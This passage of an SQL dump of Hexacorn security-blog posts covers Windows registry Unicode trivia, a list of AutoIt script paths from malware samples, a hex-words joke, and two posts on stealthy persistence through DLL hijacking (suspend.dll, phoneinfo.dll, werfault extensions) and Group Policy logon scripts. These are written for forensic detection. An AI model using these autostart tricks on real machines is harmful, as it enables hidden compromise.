often simplify my scripts this way)\nobviously, most of ‘strings’ tools fail on this too (but most of them fail on non-English Unicode strings anyway)\nmany fonts don’t support surrogates and they can’t display them (Win10 Consolas does, win7 Arial Unicode doesn’t)\nI noticed that cmd.exe on Win10 can’t ‘see’ these properly and there is no direct way to change the font to Consolas – see below the folder named same way as the key – as seen in Explorer and in cmd terminal:\n\n\n\nwho knows, maybe malware will start using it too\n\n\nAnyway, it’s more a trivia than anything else…\nNote:\nif you want to test your tool, run it on non-windows10 OS version; this way you will see if the app supports it both from the analysis perspective (proper parsing of UCS strings) and visually (font)\nShare this :)', 'Forensic Analysis', 'http://www.hexacorn.com/blog/2016/06/07/win10-registry-and-fun-with-ucsutf16/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (166, 'Permanent Link to Real coders code in Au3', 'Hexacorn', 'June 5, 2016 ', 'In my old post about malware writers I mentioned that lots of them code in VB, Today I will explore the topic that has not been explored before – Autoit malware authors. Luckily (or not), Autoit preserves paths to original Autoit script inside some of the compiled Autoit .exes. As a result.. we can decompile these scripts and get an insight into the hard drives of the bad doers…\nSo.. without further ado… this is how it looks like – see below.\nNote: some of these paths may be legitimate, this is from a large sampleset that may contain ‘clean’ legitimate files, also, note the presence of many languages: French, Spanish, German, English, Traditional Chinese, Vietnamese, Turkish:\nC:\\Documents and Settings\\Abdullah\\My Documents\\AU3\\fservice.au3\nC:\\Documents and Settings\\Administrador\\Escritorio\\Run.au3\nC:\\Documents and Settings\\Administrateur\\Bureau\\Nouveau AutoIt v3 Script.au3\nC:\\Documents and Settings\\Administrator\\Desktop\\Auto Scripts\\Win.au3\nC:\\Documents and Settings\\Administrator\\Desktop\\AutoSplash\\autosplash.au3\nC:\\Documents and Settings\\Administrator\\Desktop\\CUOICUNG.au3\nC:\\Documents and Settings\\Administrator\\Desktop\\Minh-programing\\maya\\ambr.au3\nC:\\Documents and Settings\\Administrator\\Desktop\\New Folder\\telnet_batch.au3\nC:\\Documents and Settings\\Administrator\\Desktop\\Portable Apps Creation Master 1.6\\Portable Apps Creation Master 1.6.au3\nC:\\Documents and Settings\\Administrator\\Desktop\\RARDAN YAPMA.au3\nC:\\Documents and Settings\\Administrator\\Desktop\\SRO Server\\EnCodeIt 2.0\\SRO AutoLoginAutoParty v1.97_EnCoded1.au3\nC:\\Documents and Settings\\Administrator\\Desktop\\Total Uninstall 4.6.2\\%ProgramFilesDir%\\Total Uninstall 4\\RARDAN YAPMA.au3\nC:\\Documents and Settings\\Administrator\\Desktop\\mokka\\mythwarbot.au3\nC:\\Documents and Settings\\Administrator\\Desktop\\thunghiem.au3\nC:\\Documents and Settings\\Administrator\\Desktop\\vd.au3\nC:\\Documents and Settings\\Administrator\\Desktop\\wtf.au3\nC:\\Documents and Settings\\Administrator\\Desktop\\wupdate.au3\nC:\\Documents and Settings\\Administrator\\Local Settings\\Temp\\aus.au3\nC:\\Documents and Settings\\Administrator\\My Documents\\Autoit V3\\Include\\Constants.au3\nC:\\Documents and Settings\\Administrator\\My Documents\\Autoit V3\\Include\\Process.au3\nC:\\Documents and Settings\\Administrator\\My Documents\\test.au3\nC:\\Documents and Settings\\Administrator\\桌面\\DAEMON Tools Pro\\Daemon Tools.au3\nC:\\Documents and Settings\\Administrator\\桌面\\DAEMON Tools2\\setup.au3\nC:\\Documents and Settings\\Administrator\\桌面\\Wopti\\install.au3\nC:\\Documents and Settings\\Administrator\\桌面\\無背景+運行遊戲+無計時器(右上角)@ㄚ超X10\\背景+運行遊戲+無計時器(右上角)@ㄚ超X10.au3\nC:\\Documents and Settings\\Administrator\\衯?蝃岓\\蓏慺 昑糨\\AutoIt v3 Script 昑糨.au3\nC:\\Documents and Settings\\Administrator\\袤醱\\55.au3\nC:\\Documents and Settings\\Administrator\\袤醱\\5avip_Obfuscated.au3\nC:\\Documents and Settings\\Administrator\\袤醱\\StartRun6.4埭鎢\\StartRun6.4埭鎢\\ok赻雄堍俴馱撿6.4.au3\nC:\\Documents and Settings\\Administrator\\袤醱\\new.au3\nC:\\Documents and Settings\\Administrator\\袤醱\\pubwin2007 翑忒_Obfuscated.au3\nC:\\Documents and Settings\\Administrator\\袤醱\\qq.au3\nC:\\Documents and Settings\\Administrator\\袤醱\\setup.au3\nC:\\Documents and Settings\\Administrator\\袤醱\\CGO2043赻雄境婥嗣攫\\disk2.au3\nC:\\Documents and Settings\\Administrator\\袤醱\\刉壺掛最唗.au3\nC:\\Documents and Settings\\Administrator\\袤醱\\厙壽遙\\LineSwh.au3\nC:\\Documents and Settings\\Administrator\\袤醱\\陔膘 AutoIt3褐掛.au3\nC:\\Documents and Settings\\All Users\\Documenti\\valid wg\\File per autoit\\Setup.au3\nC:\\Documents and Settings\\All\\Desktop\\Autoit\\TUL.au3\nC:\\Documents and Settings\\Barbara\\Desktop\\X-SumatraPDF_source_rev3\\X-SumatraPDF.au3\nC:\\Documents and Settings\\Barbara\\Desktop\\X-SumatraPDF_source_rev3\\x-launcher.au3\nC:\\Documents and Settings\\Barbara\\Desktop\\X-SumatraPDF_source_rev3\\x-udf.au3\nC:\\Documents and Settings\\Beliar\\Desktop\\tare rau.au3\nC:\\Documents and Settings\\BrOnZ\\Desktop\\PlayerPlus\\PlayerPlus\\Real Player.v11.0.0167.Plus.Beta\\Pach_Real.au3\nC:\\Documents and Settings\\Cedega\\My Documents\\downloads\\run-tvc.au3\nC:\\Documents and Settings\\Chef\\Desktop\\Stuff\\v2.08\\hhc hotkeys v2.au3\nC:\\Documents and Settings\\Dizzy\\Desktop\\bots\\Copy of Dizzy’s DL Bot 2.0 .au3\nC:\\Documents and Settings\\Eniko\\Desktop\\decompilat.au3\nC:\\Documents and Settings\\Fast3r\\Plocha\\AU3\\SroTools\\options2.au3\nC:\\Documents and Settings\\FeFe BoSs\\Desktop\\fefe.au3\nC:\\Documents and Settings\\Frognik\\FuckKO v0.5\\FuckKO.au3\nC:\\Documents and Settings\\Fta&Ebru\\Desktop\\Yenlogmeini Klas顤 (2)\\2.au3\nC:\\Documents and Settings\\GPC\\Desktop\\11\\auto.au3\nC:\\Documents and Settings\\Gabe\\Desktop\\my-autoit\\aurastack.au3\nC:\\Documents and Settings\\GodsPerfectBeing\\My Documents\\AU3 in progress\\ServerSwitch.au3\nC:\\Documents and Settings\\GodsPerfectBeing\\My Documents\\AU3 in progress\\spambot.au3\nC:\\Documents and Settings\\H\\Desktop\\hans’s\\Auto-it projects\\Loader\\InjectDLL.au3\nC:\\Documents and Settings\\H\\Desktop\\hans’s\\Auto-it projects\\Loader\\Loader.au3\nC:\\Documents and Settings\\Hai Long\\Desktop\\Robots.au3\nC:\\Documents and Settings\\HaxLi\\Desktop\\wm\\JoyToKey.au3\nC:\\Documents and Settings\\ILHAN\\Desktop\\kurprog.au3\nC:\\Documents and Settings\\JOHN & NEO\\Desktop\\Explorer.au3\nC:\\Documents and Settings\\JOHN & NEO\\Desktop\\da.au3\nC:\\Documents and Settings\\Jeff Tan\\Desktop\\Pinnacle.au3\nC:\\Documents and Settings\\Jonas\\Skrivbord\\Kopia av loader\\Loader\\Loader\\Loader.au3\nC:\\Documents and Settings\\Joshua Taylor\\Desktop\\KeyLog\\KeyLog\\KeyLog.au3\nC:\\Documents and Settings\\Joshua Taylor\\Desktop\\KeyLog\\KeyLog\\hotmail.au3\nC:\\Documents and Settings\\Joshua Taylor\\Desktop\\KeyLog\\KeyLog\\readfile.au3\nC:\\Documents and Settings\\KLOUDJ\\Desktop\\programs\\TechPol.au3\nC:\\Documents and Settings\\Kissy\\Desktop\\My-AutoIt\\Gondus’s Crumble Undead Bot.au3\nC:\\Documents and Settings\\Kyle\\Desktop\\glider key.au3\nC:\\Documents and Settings\\Le Dinh Thanh\\Desktop\\zin.au3\nC:\\Documents and Settings\\Le Quang Trung\\Desktop\\enet.au3\nC:\\Documents and Settings\\MARD\\Desktop\\Pinnacle.au3\nC:\\Documents and Settings\\Matthew1\\Desktop\\Scolex RavMonE Eliminator\\Scolex RavMonE Eliminator.au3\nC:\\Documents and Settings\\Mohamed\\Desktop\\2\\New AutoIt v3 Script.au3\nC:\\Documents and Settings\\Niels Maerten\\Mijn documenten\\Miniscripts\\sytemlock.au3\nC:\\Documents and Settings\\OWNER\\Desktop\\cmdhide.au3\nC:\\Documents and Settings\\Philip\\Desktop\\TB.au3\nC:\\Documents and Settings\\Piotr\\Pulpit\\Pipen’s BOTS\\COMBO BOT[release]\\Pinnacle.au3\nC:\\Documents and Settings\\Propriétaire\\Bureau\\Rayuran Project!\\gui_Obfuscated.au3\nC:\\Documents and Settings\\Radek\\Pulpit\\combo\\combo.au3\nC:\\Documents and Settings\\Radevic\\Desktop\\test\\Update.au3\nC:\\Documents and Settings\\Radevic\\Desktop\\test\\update.au3\nC:\\Documents and Settings\\RiCK\\My Documents\\My AutoIt v3 Scripts\\DJ Auto Bot Remote Control\\DJ Auto Bot Remote Control 2.au3\nC:\\Documents and Settings\\Ruud\\Bureaublad\\0.4\\OEMLOGO.au3\nC:\\Documents and Settings\\Ruud\\Bureaublad\\0.4\\oem_uninst.au3\nC:\\Documents and Settings\\Ryan\\Desktop\\AutoItMultiTool\\MultiTool.au3\nC:\\Documents and Settings\\Sange\\Desktop\\aaaaaaaaa.au3\nC:\\Documents and Settings\\Sange\\Desktop\\g.au3\nC:\\Documents and Settings\\SomeGUy\\Desktop\\Downloads\\GaiaAutoFisher [Red Bait].au3\nC:\\Documents and Settings\\Student_net\\My Documents\\tkv.au3\nC:\\Documents and Settings\\TSXP\\Desktop\\sound forge 10.au3\nC:\\Documents and Settings\\TnC\\Desktop\\Lis\\lisans.au3\nC:\\Documents and Settings\\Tony\\Desktop\\runie.au3\nC:\\Documents and Settings\\USER\\迂?轻氵嗜\\Computers\\AutoIt v3 Script 滔硐.au3\nC:\\Documents and Settings\\User\\Desktop\\yahoo.au3\nC:\\Documents and Settings\\WelCome\\Desktop\\IEXPLORE.au3\nC:\\Documents and Settings\\Whw\\Local Settings\\Temp\\aus.au3\nC:\\Documents and Settings\\XMS\\Desktop\\Scripts\\Universal Portable Script.au3\nC:\\Documents and Settings\\XPPRESP3.USER\\Desktop\\AutoBuffEnglishVer.au3\nC:\\Documents and Settings\\XTZJ\\袤醱\\xpset1\\ChangeScreenRes.au3\nC:\\Documents and Settings\\XTZJ\\袤醱\\xpset1\\xpset.au3\nC:\\Documents and Settings\\abde\\Desktop\\Logger file\\Startup.au3\nC:\\Documents and Settings\\akoutsouradis\\My Documents\\Scripts\\AutoIt\\Message.au3\nC:\\Documents and Settings\\cface\\袤醱\\陎諾荌埏赻雄腎翻\\3.au3\nC:\\Documents and Settings\\cuong@\\Desktop\\svchost3333.au3\nC:\\Documents and Settings\\cuong@\\Desktop\\svchost68.au3\nC:\\Documents and Settings\\cuong@\\My Documents\\svchost64.au3\nC:\\Documents and Settings\\cuongadsl\\Desktop\\vuive\\ads2.au3\nC:\\Documents and Settings\\danger\\Desktop\\x4x.au3\nC:\\Documents and Settings\\dbaez\\Escritorio\\scripts\\TCS_settings_server.au3\nC:\\Documents and Settings\\deh0448\\My Documents\\asdf.au3\nC:\\Documents and Settings\\eric\\Bureau\\Caderix\\scripts\\Transparency2.5.au3\nC:\\Documents and Settings\\h\\Desktop\\IEXPLORE.au3\nC:\\Documents and Settings\\h\\Desktop\\fuckall.au3\nC:\\Documents and Settings\\huycuong\\My Documents\\111.au3\nC:\\Documents and Settings\\jackal\\夥鰻 賊\\kmp.au3\nC:\\Documents and Settings\\lwc\\袤醱\\QQ躇鎢hash硉蛌MD5.au3\nC:\\Documents and Settings\\manage\\袤醱\\Gpedit\\CheckPWD.au3\nC:\\Documents and Settings\\manage\\袤醱\\Gpedit\\System Optimize Tools.au3\nC:\\Documents and Settings\\nabreu\\Ambiente de trabalho\\Share\\Bots\\Bot K2 DL\\Pinnacle.au3\nC:\\Documents and Settings\\nhatquanglan\\Desktop\\cuoicung.au3\nC:\\Documents and Settings\\nhatquanglan\\Desktop\\vietlai.au3\nC:\\Documents and Settings\\nn\\Desktop\\test.au3\nC:\\Documents and Settings\\pash-TET.PASHA\\Desktop\\123.au3\nC:\\Documents and Settings\\pash-TET.PASHA\\Desktop\\1233213.au3\nC:\\Documents and Settings\\pc\\Desktop\\PersonalScreenRes-Install.au3\nC:\\Documents and Settings\\phuong anh\\Desktop\\CUOICUNG.au3\nC:\\Documents and Settings\\phuong anh\\Desktop\\nhatquanglan.au3\nC:\\Documents and Settings\\phuong anh\\Desktop\\nhatquanglan_Obfuscated.au3\nC:\\Documents and Settings\\rallen\\Desktop\\Extend.au3\nC:\\Documents and Settings\\robotics\\Desktop\\New Folder\\Aggro\\ABv0.2\\AggroBotv0.23.au3\nC:\\Documents and Settings\\rsarner\\Desktop\\ROnce.AU3\nC:\\Documents and Settings\\s0uLtaker\\My Documents\\Archlord Stuff\\bot\\auto IT\\MSN.au3\nC:\\Documents and Settings\\tence\\Bureau\\KAV\\autoit\\kasperskys-cd-modif3.au3\nC:\\Documents and Settings\\than sau\\Desktop\\Tu buff silkroad v1.01.au3\nC:\\Documents and Settings\\thuy\\Desktop\\kill.au3\nC:\\Documents and Settings\\thuy\\Desktop\\popup web an.au3\nC:\\Documents and Settings\\trung\\My Documents\\YIMBot\\dkc.au3\nC:\\Documents and Settings\\truong nhat\\Desktop\\CUOICUNG.au3\nC:\\Documents and Settings\\truong nhat\\Desktop\\nhatquanglan.au3\nC:\\Documents and Settings\\truong nhat\\Desktop\\nhatquanglan_Obfuscated.au3\nC:\\Documents and Settings\\viet\\Desktop\\love.au3\nC:\\Documents and Settings\\weibaichi\\袤醱\\123.au3\nC:\\Documents and Settings\\x0wner\\Desktop\\florida\\PuffBotv1.03-priv(1)\\Include\\array.au3\nC:\\Documents and Settings\\x0wner\\Desktop\\florida\\PuffBotv1.03-priv(1)\\core.au3\nC:\\Documents and Settings\\x0wner\\Desktop\\florida\\PuffBotv1.03-priv(1)\\include\\File.au3\nC:\\Documents and Settings\\x0wner\\Desktop\\florida\\PuffBotv1.03-priv(1)\\include\\IRC.au3\nC:\\Documents and Settings\\x0wner\\Desktop\\florida\\PuffBotv1.03-priv(1)\\include\\config.au3\nC:\\Documents and Settings\\x0wner\\Desktop\\florida\\PuffBotv1.03-priv(1)\\include\\iNet.au3\nC:\\Documents and Settings\\x0wner\\Desktop\\florida\\PuffBotv1.03-priv(1)\\include\\im.au3\nC:\\Documents and Settings\\x0wner\\Desktop\\florida\\PuffBotv1.03-priv(1)\\include\\lang.au3\nC:\\Documents and Settings\\x0wner\\Desktop\\florida\\PuffBotv1.03-priv(1)\\include\\os.au3\nC:\\Documents and Settings\\x0wner\\Desktop\\florida\\PuffBotv1.03-priv(1)\\include\\uptime.au3\nC:\\Documents and Settings\\xp xp\\衯?蝃岓\\彶 衯?蝃岓\\蓏慺 昑糨\\AutoIt v3 Script 昑糨.au3\nC:\\Documents and Settings\\xp xp\\衯?蝃岓\\蓏慺 昑糨\\AutoIt v3 Script 昑糨.au3\nC:\\Documents and Settings\\選顫葬\\夥鰻 賊\\portable URLSnooper\\portable URLSnooper\\test.au3\nC:\\Documents and Settings\\轉儰餤冓搿玁?嚦鎀\\Mad Dog.au3\nC:\\Documents and Settings\\拸窩\\袤醱\\Search.au3\nC:\\Documents and Settings\\拸窩\\袤醱\\UX-theme-patcher\\Path.au3\nC:\\Documents and Settings\\拸窩\\袤醱\\UX-theme-patcher\\Restore.au3\nC:\\Documents and Settings\\拸窩\\袤醱\\qqq.au3\nC:\\Documents\\Scripts\\Flickr AutoDownloadr\\FAD frontend.au3\nC:\\Dokumente und Einstellungen\\8\\Desktop\\Dupe AccHack\\Starter.au3\nC:\\Dokumente und Einstellungen\\8\\Desktop\\Dupe AccHack\\csrss.au3\nC:\\Dokumente und Einstellungen\\Administrator\\Desktop\\Botnew\\Packs\\2\\1Original\\Kopie von Bot.au3\nC:\\Dokumente und Einstellungen\\Administrator\\Desktop\\Botnew\\Packs\\5\\Allok.AVI.to.DVD.SVCD.VCD.Converter.v2.1.4.WinAll.Regged-EiTheL\\1Original\\Kopie von Bot.au3\nC:\\Dokumente und Einstellungen\\Administrator\\Desktop\\Botnew\\Packs\\AAF\\Adobe Creative Suite 2 Keygen (Photoshop Cs2, Illustrator Cs2, Golive Cs2, More)\\1\\Kopie von Bot.au3\nC:\\Dokumente und Einstellungen\\Administrator\\Desktop\\Botnew\\Packs\\AAF\\Adobe Photoshop CS2 9.0 Final Keygen & Acitvater\\1\\Kopie von Bot.au3\nC:\\Dokumente und Einstellungen\\Administrator\\Desktop\\P_NAB_source\\looter.au3\nC:\\Dokumente und Einstellungen\\Besitzer\\Desktop\\tools\\lossbot\\blubtmo_lossbot1.20.au3\nC:\\Dokumente und Einstellungen\\Daniel\\Desktop\\Fertige Bots\\High End\\Schoko愀 Bot\\Data\\IG5.au3\nC:\\Dokumente und Einstellungen\\Daniel\\Desktop\\Fertige Bots\\High End\\Schoko愀 Bot\\Data\\IG6.au3\nC:\\Dokumente und Einstellungen\\IroX\\Desktop\\PiroX B0t\\pirox.au3\nC:\\Dokumente und Einstellungen\\Keller.Florian\\Desktop\\copy.au3\nC:\\Dokumente und Einstellungen\\Lumsk\\Desktop\\Botnew\\Family Keylogger\\Family Keylogger v2.80 with Crack\\Limewire.au3\nC:\\Dokumente und Einstellungen\\Sirus\\Desktop\\1 click Flasher\\test.au3\nC:\\Dokumente und Einstellungen\\fearlumsk\\Desktop\\Bot\\Bot\\CLIENT.au3\nC:\\Dokumente und Einstellungen\\fearlumsk\\Desktop\\Bot\\Bot\\IRCJoinNew.au3\nC:\\Dokumente und Einstellungen\\fearlumsk\\Desktop\\Bot\\Bot\\IRCJoinNew2.au3\nC:\\Dokumente und Einstellungen\\root\\Desktop\\spread\\Include\\array.au3\nC:\\Dokumente und Einstellungen\\root\\Desktop\\spread\\core.au3\nC:\\Dokumente und Einstellungen\\root\\Desktop\\spread\\include\\File.au3\nC:\\Dokumente und Einstellungen\\root\\Desktop\\spread\\include\\IRC.au3\nC:\\Dokumente und Einstellungen\\root\\Desktop\\spread\\include\\config.au3\nC:\\Dokumente und Einstellungen\\root\\Desktop\\spread\\include\\iNet.au3\nC:\\Dokumente und Einstellungen\\root\\Desktop\\spread\\include\\im.au3\nC:\\Dokumente und Einstellungen\\root\\Desktop\\spread\\include\\lang.au3\nC:\\Dokumente und Einstellungen\\root\\Desktop\\spread\\include\\os.au3\nC:\\Dokumente und Einstellungen\\root\\Desktop\\spread\\include\\uptime.au3\nC:\\Users\\Admin\\Desktop\\sss.au3\nC:\\Users\\Administrator\\Desktop\\qwee.au3\nC:\\Users\\Administrator\\Documents\\Projekte\\Zeiss\\CZ – Enterprise Discovery\\WinEDMSG\\Version 1.1.0\\SOURCE\\WinEDMsg.au3\nC:\\Users\\BossTheTuga\\AppData\\Local\\Temp\\loaderstub.au3\nC:\\Users\\Brunno\\Desktop\\antileecher.au3\nC:\\Users\\Dhilip\\Desktop\\WGAN_Rmvr2.au3\nC:\\Users\\Forever2008\\Desktop\\PORTABLE PhotoshopCS4 By ForeverXP\\Iniciar.au3\nC:\\Users\\John\\Documents\\Portable Software\\AviScreenPortable\\Other\\AviScreen Portable Source\\AutoItTemplate.au3\nC:\\Users\\John\\Documents\\Portable Software\\AviScreenPortable\\Other\\AviScreen Portable Source\\AviScreenPortable.au3\nC:\\Users\\John\\Documents\\Portable Software\\AviScreenPortable\\Other\\AviScreen Portable Source\\BatchExec.au3\nC:\\Users\\John\\Documents\\Portable Software\\AviScreenPortable\\Other\\AviScreen Portable Source\\Registry.au3\nC:\\Users\\MediaDogg\\Desktop\\GUI-055xDev\\CopyGui.au3\nC:\\Users\\MediaDogg\\Desktop\\GUI-055xDev\\FilterGUI.au3\nC:\\Users\\MediaDogg\\Desktop\\GUI-055xDev\\GUI-057x.au3\nC:\\Users\\NURZA\\Desktop\\Albator MDP Stealer\\7Zip.au3″ , EXECUTE ( $A0D0F612E41 ) & “\\7Zip.au3\nC:\\Users\\NURZA\\Desktop\\Albator MDP Stealer\\FTP.au3” , EXECUTE ( $A180F81360F ) & “\\FTP.au3\nC:\\Users\\NURZA\\Desktop\\Albator MDP Stealer\\Security.au3” , EXECUTE ( $A0EFE21213D ) & “\\Security.au3\nC:\\Users\\NURZA\\Desktop\\Albator MDP Stealer\\SecurityConstants.au3” , EXECUTE ( $A280F21305C ) & “\\SecurityConstants.au3\nC:\\Users\\NURZA\\Desktop\\Albator MDP Stealer\\SendMessage.au3” , EXECUTE ( $A58FEE14E3B ) & “\\SendMessage.au3\nC:\\Users\\NURZA\\Desktop\\Albator MDP Stealer\\StructureConstants.au3” , EXECUTE ( $A4B0F013758 ) & “\\StructureConstants.au3\nC:\\Users\\NURZA\\Desktop\\Albator MDP Stealer\\WinAPI.au3” , EXECUTE ( $A480FC13826 ) & “\\WinAPI.au3\nC:\\Users\\NURZA\\Desktop\\Albator MDP Stealer\\WindowsConstants.au3” , EXECUTE ( $A350FE11B29 ) & “\\WindowsConstants.au3\nC:\\Users\\NURZA\\Desktop\\Albator MDP Stealer\\file.au3” , EXECUTE ( $A580F41111C ) & “\\file.au3\nC:\\Users\\Owner\\Desktop\\Deploy.au3\nC:\\Users\\Paul\\Desktop\\OneKey\\closeKms.au3\nC:\\Users\\S & M\\Desktop\\RDK\\RDK.au3\nC:\\Users\\searchengine\\Desktop\\Display.au3\nC:\\Users\\slipo\\Documents\\Mis archivos recibidos\\[HitX]\\[HitX]\\Include\\array.au3\nC:\\Users\\slipo\\Documents\\Mis archivos recibidos\\[HitX]\\[HitX]\\core.au3\nC:\\Users\\slipo\\Documents\\Mis archivos recibidos\\[HitX]\\[HitX]\\include\\File.au3\nC:\\Users\\slipo\\Documents\\Mis archivos recibidos\\[HitX]\\[HitX]\\include\\IRC.au3\nC:\\Users\\slipo\\Documents\\Mis archivos recibidos\\[HitX]\\[HitX]\\include\\config.au3\nC:\\Users\\slipo\\Documents\\Mis archivos recibidos\\[HitX]\\[HitX]\\include\\iNet.au3\nC:\\Users\\slipo\\Documents\\Mis archivos recibidos\\[HitX]\\[HitX]\\include\\im.au3\nC:\\Users\\slipo\\Documents\\Mis archivos recibidos\\[HitX]\\[HitX]\\include\\lang.au3\nC:\\Users\\slipo\\Documents\\Mis archivos recibidos\\[HitX]\\[HitX]\\include\\os.au3\nC:\\Users\\slipo\\Documents\\Mis archivos recibidos\\[HitX]\\[HitX]\\include\\uptime.au3\nC:\\Users\\slipo\\Documents\\Mis archivos recibidos\\[HitX]\\[HitX]\\include\\usb.au3\nC:\\Users\\volkan\\Desktop\\4.au3\nC:\\Users\\zouhir\\Desktop\\haching\\Nouveau AutoIt v3 Script.au3\nShare this :)', 'File Formats ZOO, Forensic Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2016/06/05/real-coders-code-in-au3/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (167, 'Permanent Link to The hex stories – hex wordsmiths playing with the hex words in the hex world', 'Hexacorn', 'June 3, 2016 ', 'I was wondering what is the longest meaningful phrase made out of words containing only letters A..F – the only letters that are allowed in a hexadecimal system. After downloading some word lists I came up with the following:\n\nfacaded facade –  a double facade\ndefaced deface – when a hacked entity that was already hacked is hacked again before recovery (i.e. double defaced)\nbeefed beef – the beef that is very juicy, or with a lot of marble, or it’s stinky\nbe deaf be deaf, be dead, be dead – probably part of some lyrics\ndecaffaced – to be overdecaffeinated\n\nAnd the short story about the little deaf bee that discovered that her dad is a hated fed abusing decaffeinated coffee (probably both attended the Defcon):\na deaf baffed babe bee faced decaffaced dad: a fed! \r\nbe dead, facaded face! bad dad!\nAfter playing with it and wondering what the heck am I doing I decided to google around, and.. turns out I was not the first one to think of it. There are actually more similar efforts.\nShare this :)', 'Silly', 'http://www.hexacorn.com/blog/2016/06/03/the-hex-stories-hex-wordsmiths-playing-with-the-hex-words-in-the-hex-world/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (168, 'Permanent Link to Beyond good ol’ Run key, Part 40', 'Hexacorn', 'June 2, 2016 ', 'And here we are… another round anniversary…\nTo celebrate this special event, I have prepared a special dish for Windows 10 lovers \nTo inaugurate the celebration:\n\nCreate C:\\Program Files\\Internet Explorer\\suspend.dll\nProfit\n\nYup. It will launch anytime user starts IE. And when they exit it (the life of a DLL…).\nTo continue the festivities:\n\nCreate phoneinfo.dll anywhere the PATH points to, or inside the c:\\windows\\system, C:\\Windows\\System32\\wbem or on the Desktop – IE will try really hard to load it:\n\nProfit\n\nYup. It will launch anytime user starts IE too. And yup, when they exit it too.\nIt does work for 64-bit processes too.\nAnd the final fanfares…\nWhen your program crashes on Windows 10, werfault.exe will attempt to load loads of non-existing debugging extensions.:\n\nC:\\Windows\\SYSTEM32\\WINXP\\uext.dll\nC:\\Windows\\SYSTEM32\\winext\\uext.dll\nC:\\Windows\\SYSTEM32\\winext\\arcade\\uext.dll\nC:\\Windows\\SYSTEM32\\pri\\uext.dll\nC:\\Windows\\System32\\uext.dll\nC:\\Windows\\SYSTEM32\\winext\\arcade\\uext.dll\nC:\\Windows\\System32\\uext.dll\nC:\\Windows\\SYSTEM32\\WINXP\\ntsdexts.dll\nC:\\Windows\\SYSTEM32\\winext\\ntsdexts.dll\nC:\\Windows\\SYSTEM32\\winext\\arcade\\ntsdexts.dll\nC:\\Windows\\SYSTEM32\\pri\\ntsdexts.dll\nC:\\Windows\\System32\\ntsdexts.dll\nC:\\Windows\\SYSTEM32\\winext\\arcade\\ntsdexts.dll\nC:\\Windows\\System32\\ntsdexts.dll\n\nBonus #1:\nThe phoneinfo.dll DLL seems to be used by a lot of processes (it is actually loaded by urlmon.dll, so lots of processes are affected).\nBonus #2:\nCursory analysis of code that is responsible for loading this DLL indicates that it’s most likely code used on Windows phones-only and it’s just the DLL is not present on Desktop Windows (yet the code loading the phantom DLL remained). The DLL is responsible for telling the urlmon what Phone Manufacturer and Model to add to one of the internal User Agent strings inside the urlmon library\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Incident Response,', 'http://www.hexacorn.com/blog/2016/06/02/beyond-good-ol-run-key-part-40/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (169, 'Permanent Link to Beyond good ol’ Run key, Part 39', 'Hexacorn', 'May 30, 2016 ', 'In my previous post in this series I talked about the Logon scripts. This nice concept of being able to run some code when system-wide, or user-wide events happen is very useful in a managed environment.\nThe Logon event is one of a number of events that can be recognized by the system and as a response, an appropriate script can be executed. Other events include Logoff, Startup and Shutdown events. Apart from the already described mechanism, one can rely on Group Policies and use GPEDIT.MSC to set up event-aware scripts on the local system.\nFor example:\n\nStartup and Shutdown\n\n\n\nLogon and Logoff\n\n\n(note, the screenshots are from XP cuz it’s holiday and I am lazy, but same applies to newer versions of Windows)\nOnce the appropriate Event is selected f.ex. Startup:\n\nWe can add the script using a dialog box:\n\nWe can also repeat the sequence and add a number of scripts:\n\nThe system stores the scripts in the following location:\n\nc:\\WINDOWS\\System32\\GroupPolicy\\Machine\\Scripts\n\n\nInside the folder we can see the following files:\n\nThe config file:\n\nc:\\WINDOWS\\System32\\GroupPolicy\\Machine\\Scripts\\scripts.ini\n\n\nand our scripts:\n\nc:\\WINDOWS\\System32\\GroupPolicy\\Machine\\Scripts\\Startup\\Startup1.bat\nc:\\WINDOWS\\System32\\GroupPolicy\\Machine\\Scripts\\Startup\\Startup2.bat\nc:\\WINDOWS\\System32\\GroupPolicy\\Machine\\Scripts\\Shutdown\\Shutdown1.bat\nc:\\WINDOWS\\System32\\GroupPolicy\\Machine\\Scripts\\Shutdown\\Shutdown2.bat\n\n\n\nNote: I have added 2 scripts for each event.\nThe content of the files is as follows:\n\nAnd the same story for Logon/Logoff events:\n\nThe config file:\n\nc:\\WINDOWS\\System32\\GroupPolicy\\User\\Scripts\\scripts.ini\n\n\nand our scripts:\n\nc:\\WINDOWS\\System32\\GroupPolicy\\User\\Scripts\\Logoff\\Logoff1.bat\nc:\\WINDOWS\\System32\\GroupPolicy\\User\\Scripts\\Logoff\\Logoff2.bat\nc:\\WINDOWS\\System32\\GroupPolicy\\User\\Scripts\\Logon\\Logon1.bat\nc:\\WINDOWS\\System32\\GroupPolicy\\User\\Scripts\\Logon\\Logon2.bat\n\n\n\nwith the content as follows:\n\nIf we restart the computer now (making all the events happen: Logoff, Shutdown, Startup, Logon), we can observe that our scripts are all executed one by one – as indicated by the ‘trace’ files created by each script:\nI also temporarily modified the startup script to pause before continuing – just to show that the scripts are executed by userinit.exe:\n\nTrivia fact: while preparing the post I noticed that an old autoruns present on my test VM shows some of the scripts incorrectly i.e. under the HKLM\\…\\Run key:\n\nThe latest version works like a charm… or not  – note that scripts are duplicated and Logoff event shows 6 entries instead of 2:\nIf in doubt, we can always visit the Registry entries where the information about these 4 events is stored:\n\n\nInspecting the Registry entries we can notice that the …\\Scripts\\Logon\\<number>\\FileSysPath properties can be modified:\n\nIn my case I modify it to c:\\test and I am recreating the Logon/Logoff scripts folder structure there:\n\nLuckily, autoruns picks it up too:\n\nLast, but not last – if such entries already exist on the system, an attacker could simply append some commands to existing scripts, or hijack execution of existing commands using many of existing tricks (f.ex. path interception, path companion, etc.).\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Incident Response,', 'http://www.hexacorn.com/blog/2016/05/30/beyond-good-ol-run-key-part-39/\n');
